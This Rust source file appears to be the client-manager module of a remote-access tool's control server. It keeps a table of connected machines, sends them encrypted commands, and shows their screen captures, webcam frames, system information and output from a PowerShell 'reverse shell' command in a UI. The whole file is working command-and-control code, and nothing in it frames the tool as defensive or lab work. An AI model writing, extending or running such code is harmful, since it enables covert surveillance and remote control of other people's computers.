use std::collections::HashMap;

use aes_gcm::aead::generic_array::GenericArray;
use egui::ColorImage;
use shared::{commands::*, crypto::Encryption};
use tokio::sync::mpsc::unbounded_channel;

use crate::{
    manager::client::{Client, ClientCommand, ClientPassthroughMouthpiece, ClientResponse},
    manager::types::*,
};

pub mod types;

//////////////
pub mod client;
//////////////
// ClientManager
pub struct ClientManager {
    pub mouthpiece: ClientManagerMouthpiece,
    clients: HashMap<String, Client>, // Mutex, Client
}
impl ClientManager {
    pub fn new(mouthpiece: ClientManagerMouthpiece) -> Self { // constructor
        Self {
            mouthpiece: mouthpiece, // we take a mouthpiece made by the main thread as an argument
            clients: HashMap::new(), // create a new hashmap to store clients that we keep track of, key = mutex (string)
        }
    }
    pub async fn run(mut self) {
        // implement
        println!("[*] manager spawned"); // runs on its own thread, separate from the UI and the main server listener

        loop {
            tokio::select! {
                Some(client_command) = self.mouthpiece.client.from_client.recv() => { // have we received a message from a client?
                    match client_command {
                        ClientResponse::Read(mutex, buf) => { // if it's a response from reading the tcp stream...
                            // then we de-serialise it to make it a struct we can work with, using bincode
                            let (response, _size): (BaseResponse, usize) = bincode::decode_from_slice(&buf, bincode::config::standard()).unwrap();
                            
                            // these responses below get re-evaluated by the UI, we just process them and forward what's needed
                            // this match arm is here instead of the UI because **i needed a way to process the screenshot on a different thread than the UI**
                            //   because it would lag the window on each update otherwise; the UI only gets the final img, so it SHOULDN'T have to do any work
                            match response.response {
                                ///////////////////////////////////
                                Response::Success => { // these responses don't contain any data and are simply letting the server know something ran without trouble
                                    let _ = self.mouthpiece.to_ui.send(UiManagerResponse::GetResponse(mutex, ProcessedResponse::Success));
                                }
                                Response::Error(error) => { // error handling from the client to the server
                                    let _ = self.mouthpiece.to_ui.send(UiManagerResponse::GetResponse(mutex, ProcessedResponse::Error(error)));
                                },
                                Response::CapturePacket(capture_type, packet) => { // in the case we have received a screenshot/camera frame or audio packet...
                                    match packet {
                                        CapturePacket::Video(data) => { // if this data is video (screen or webcam)
                                            let decoded_image = image::load_from_memory(&data.data).unwrap(); // convert it to a DynamicImage (image crate)
                                            let rgba_image = decoded_image.to_rgba8(); // convert to rgba8, something egui will accept
                                            let image = ColorImage::from_rgba_unmultiplied( // create ColorImage (egui) from rgba
                                                [data.width as usize, data.height as usize], // use the dimensions of the image.
                                                // ^ client sends this because we cannot guess it
                                                rgba_image.as_raw(),
                                            );

                                            // finally send the ColorImage to the UI for it to be displayed. we do not care about how the UI responds to this so 'let _'
                                            let _ = self.mouthpiece.to_ui.send(UiManagerResponse::GetResponse(mutex, ProcessedResponse::CapturePacket(capture_type, image)));

                                        },
                                        CapturePacket::Audio(_data) => {/* not implemented because of cross-platform issues! annoying. */}
                                    }
                                }
                                ///////////////////////////////////
                                Response::ComputerInfo(info) => { // if we are sent a response to the computer_info command...
                                    let socket = self.clients.get(&mutex).unwrap().socket.clone(); // get the address and port of the client
                                    let _ = self.mouthpiece.to_ui.send(UiManagerResponse::GetResponse(mutex, ProcessedResponse::ComputerInfo(
                                        info, // 'processing' the response in this case means sending the info AND the socket to the UI for displaying in the list,
                                        socket // using a customised enumerator with arguments as part of a struct called ProcessedResponse
                                    )));
                                },
                                Response::PowerShell(stdout) => { // if we receive a response to the reverse shell cmd
                                    let _ = self.mouthpiece.to_ui.send(UiManagerResponse::GetResponse(mutex, ProcessedResponse::PowerShell(stdout))); // send the output to the UI
                                }
                            }

                        },
                        ClientResponse::Disconnect(mutex) => { // if a client has disconnected (broken pipe)
                            println!("[*][{}] disconnected", mutex);
                            self.clients.remove(&mutex); // we remove it from our hashmap
                            let _ = self.mouthpiece.to_ui.send(UiManagerResponse::Remove(mutex)); // and we tell the UI to remove it from its view state so it no longer shows up
                        }
                    }
                }
                Some(ui_command) = self.mouthpiece.from_ui.recv() => { // this block handles receiving commands from the UI
                    match ui_command {
                        UiManagerCommand::SendCommand(mutex, command) => { // if we are told to send a command to a client
                            if let Some(client) = self.clients.get_mut(&mutex) { // we will try to get that client from our hashmap
                                if let Err(_e) = client.sender.send(ClientCommand::Write( // send through the client's channel, telling it to write to tcp
                                    bincode::encode_to_vec(BaseCommand { // encode our struct into bytes so it can be sent over TCP
                                        id: client.counter, // keep track of how many commands we have sent so we don't backtrack or run the same command twice... somehow
                                        command: command
                                    }, bincode::config::standard()).unwrap()
                                )) {
                                    println!("[*][manager] failed to send command to client"); // error handling
                                } else { client.counter += 1; }; // if command sent, increase counter by 1 so the next command gets a new ID
                            }
                        },
                        UiManagerCommand::Disconnect(mutex) => { // if the UI tells us to disconnect a client...
                            if let Some(client) = self.clients.get_mut(&mutex) {
                                client.handle.abort(); // we will abort the task handling tcp communication, effectively disconnecting it
                                self.clients.remove(&mutex); // we remove it from our hashmap to forget about it
                                let _ = self.mouthpiece.to_ui.send(UiManagerResponse::Remove(mutex)); // we tell the UI to remove it from its view state to stop showing it
                            }
                        }
                    }
                },
                Some(server_command) = self.mouthpiece.from_server.recv() => { // this block handles commands from the server
                    println!("[*][manager] received command from server");
                    match server_command {
                        ServerManagerMessage::ClearClients => { // when the server stops listening, this is sent
                            println!("[*] clearing clients");
                            for (_, client) in self.clients.iter() { // _ is the index for the iterated value within the array, but we don't use it
                                println!("[*] aborting task {}", client.mutex);
                                client.handle.abort(); // abort a client task, cutting off tcp communication to disconnect it
                            }
                            self.clients.clear(); // wipe our hashmap table to forget all clients
                            let _ = self.mouthpiece.to_ui.send(UiManagerResponse::RemoveAll); // tell the UI to clear its view state of clients
                        },
                        ServerManagerMessage::ClientConnect(whitelisted, stream) => {
                            {
                                // this block handles the code that runs upon the new connection of a client
                                let (to_client, from_manager) = unbounded_channel::<ClientCommand>(); // we create a unique channel for the client to communicate with the manager
                                let mutex = whitelisted.mutex.clone();
                                let task_mutex = mutex.clone(); // moved into a new thread, we must keep the original, so clone it. cheap
                                let to_manager = self.mouthpiece.client.to_manager.clone(); // clone a channel to communicate with manager for each client to talk to it.
                                let encryption = Encryption::new(GenericArray::from_slice(&whitelisted.key)); // make an encryption struct for this client so we can encrypt/decrypt
                                let socket = stream.peer_addr().unwrap(); // get the address and port of the client for displaying in the UI, stored for easy access.

                                let client = Client { // create a new Client struct to store in our hashmap
                                    mutex: mutex.clone(),
                                    socket: socket,
                                    counter: 1, // 0 is reserved for computer info
                                    sender: to_client, // no mouthpiece needed because we clone to_manager,
                                    handle: tokio::spawn(async move {
                                        // cloned mutex is moved here, so are other used values.
                                        // client::task starts a listening loop for data sent by the client
                                        if let Err(err) = client::task(task_mutex, encryption, stream, ClientPassthroughMouthpiece {
                                            to_manager: to_manager, // mouthpieces for client <---> manager communication
                                            from_manager: from_manager
                                        }).await {
                                            println!("[x][manager] {:?}", err); // error handling
                                        };
                                    })
                                };
                                self.clients.insert(mutex, client); // finally, add this new client to the hashmap so we can keep track of it and send it commands in the future
                            }
                        }
                    }
                }
                else => break, // we are done running, break
            }
        }
    }
}
